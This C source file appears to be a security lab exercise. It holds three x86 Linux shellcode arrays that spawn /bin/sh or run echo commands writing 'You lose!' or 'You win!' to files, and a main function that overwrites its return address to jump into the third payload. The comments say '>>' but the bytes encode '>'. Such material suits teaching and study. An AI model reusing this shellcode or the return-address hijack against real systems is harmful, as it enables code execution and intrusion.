// /bin/sh
char shellcode1[] = 
     "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
     "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
     "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41"
     "\x4b\x4b\x4b\x4b";

// /bin/sh -c 'echo "You lose!" >> foo.txt'
char shellcode2[] =
     "\xeb\x4a\x90\x90\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08"
     "\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4c\x24\xfc\x8d\x56\x0c\xcd"
     "\x80\x90\x5e\x56\x88\x46\x02\xe8\xda\xff\xff\xff\x2f\x62\x69"
     "\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x4b\x4b\x4b\x4b\x90\x90"
     "\x5e\x56\x88\x46\x1a\xe8\xda\xff\xff\xff\x2d\x63\x4a\x90\x90"
     "\x90\x31\xc0\x83\xec\x04\x89\x04\x24\xe8\xe3\xff\xff\xff\x65"
     "\x63\x68\x6f\x20\x22\x59\x6f\x75\x20\x6c\x6f\x73\x65\x21\x22"
     "\x20\x3e\x20\x66\x6f\x6f\x2e\x74\x78\x74\x4a";

// /bin/sh -c 'echo "You win!" >> bar.txt'
char shellcode3[] =
     "\xeb\x4a\x90\x90\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08"
     "\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4c\x24\xfc\x8d\x56\x0c\xcd"
     "\x80\x90\x5e\x56\x88\x46\x02\xe8\xda\xff\xff\xff\x2f\x62\x69"
     "\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x4b\x4b\x4b\x4b\x90\x90"
     "\x5e\x56\x88\x46\x19\xe8\xda\xff\xff\xff\x2d\x63\x4a\x90\x90"
     "\x90\x31\xc0\x83\xec\x04\x89\x04\x24\xe8\xe3\xff\xff\xff\x65"
     "\x63\x68\x6f\x20\x22\x59\x6f\x75\x20\x77\x69\x6e\x21\x22\x20"
     "\x3e\x20\x62\x61\x72\x2e\x74\x78\x74\x4a";

int main()
{
     int *ret;
     ret = (int *) &ret + 2;
     (*ret) = (int)shellcode3;
}
